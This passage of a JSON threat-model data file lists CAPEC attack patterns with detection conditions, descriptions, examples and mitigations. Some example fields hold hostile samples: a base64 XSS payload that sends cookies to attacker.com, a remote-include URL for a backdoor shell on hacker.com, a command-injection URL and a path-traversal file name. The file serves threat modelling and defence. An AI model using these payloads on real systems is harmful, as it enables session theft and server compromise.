attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "116", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "117", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.disablesiFrames is False", "cvss": "", "description": "iFrame Overlay", "details": "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.", "example": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.", "id": "118", "mitigations": "Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.", "references": "https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP20"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)", "cvss": "", "description": "File Content Injection", "details": "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.", "example": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]", "id": "119", "mitigations": "Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.", "references": "https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "INP23"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Privilege Escalation", "details": "An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "120", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "AC12"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Hijacking a privileged process", "details": "An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "121", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "AC13"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False and (target.usesEnvironmentVariables is True or target.controls.validatesInput is False)", "cvss": "", "description": "Catching exception throw/signal from privileged block", "details": "Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.", "example": "Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.", "id": "122", "mitigations": "Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.", "references": "https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "AC14"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False or target.controls.validatesInput is False", "cvss": "", "description": "Filter Failure through Buffer Overflow", "details": "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).", "example": "Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.", "id": "123", "mitigations": "Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP24"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Resource Injection", "details": "An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.", "example": "A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files.", "id": "124", "mitigations": "Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP25"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Code Injection", "details": "An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.", "example": "When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.", "id": "125", "mitigations": "Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP26"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting HTML Attributes", "details": "An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.", "example": "Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.", "id": "126", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/243.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "INP27"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "127", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "128", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Using Invalid Characters", "details": "An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.", "example": "The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.", "id": "129", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "INP30"}, {"assumption": null, "condition": "target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)", "cvss": "", "description": "Command Injection", "details": "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.", "example": "Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented.", "id": "130", "mitigations": "All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.", "references": "https://capec.mitre.org/data/definitions/248.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP31"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XML Injection", "details": "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.", "example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.", "id": "131", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.", "references": "https://capec.mitre.org/data/definitions/250.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP32"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Remote Code Inclusion", "details": "The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.", "example": "URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.", "id": "132", "mitigations": "Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.", "references": "https://capec.mitre.org/data/definitions/253.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP33"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Leverage Alternate Encoding", "details": "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.", "example": "Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.", "id": "133", "mitigations": "Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.", "references": "https://capec.mitre.org/data/definitions/267.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP35"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False", "cvss": "", "description": "Schema Poisoning", "details": "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.", "example": "In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.", "id": "134", "mitigations": "Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.", "references": "https://capec.mitre.org/data/definitions/271.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "AC15"}, {"assumption": null, "condition": "(target.controls.usesStrongSessionIdentifiers is False or target.controls.encryptsCookies is False) and target.controls.definesConnectionTimeout is False", "cvss": "", "description": "Session Hijacking - ClientSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "135", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "AC18"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Argument Injection", "details": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.", "example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]", "id": "136", "mitigations": "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.", "references": "https://capec.mitre.org/data/definitions/6.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP41"}, {"assumption": null, "condition": "target.controls.definesConnectionTimeout is False and (target.controls.usesMFA is False or target.controls.encryptsSessionData is False)", "cvss": "", "description": "Reusing Session IDs (aka Session Replay) - ClientSide", "details": "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.", "example": "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258", "id": "137", "mitigations": "Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.", "references": "https://capec.mitre.org/data/definitions/60.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "AC20"}, {"assumption": null, "condition": "target.controls.implementsCSRFToken is False or target.controls.verifySessionIdentifiers is False", "cvss": "", "description": "Cross Site Request Forgery", "details": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.", "example": "While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.", "id": "138", "mitigations": "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.", "references": "https://capec.mitre.org/data/definitions/62.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "AC21"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "Overflow Buffers", "details": "Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.", "example": "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.", "id": "139", "mitigations": "Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.", "references": "https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "INP02"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust 